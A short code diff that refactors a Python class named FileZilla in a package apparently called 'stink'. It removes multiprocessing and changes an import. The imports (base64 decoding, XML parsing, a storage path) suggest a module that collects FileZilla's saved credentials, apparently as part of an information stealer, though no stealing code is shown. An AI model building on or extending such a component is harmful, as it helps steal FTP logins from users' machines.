@@ -1,15 +1,13 @@
 from base64 import b64decode
 from xml.etree import ElementTree
-from multiprocessing import Process
 from os import listdir, path, makedirs
 
-from ..helpers.config import FileZillaConfig
+from stink.helpers.config import FileZillaConfig
 
 
-class FileZilla(Process):
+class FileZilla:
 
     def __init__(self, storage_path: str, folder: str, errors: bool):
-        Process.__init__(self)
 
         self.config = FileZillaConfig()
         self.storage_path = storage_path
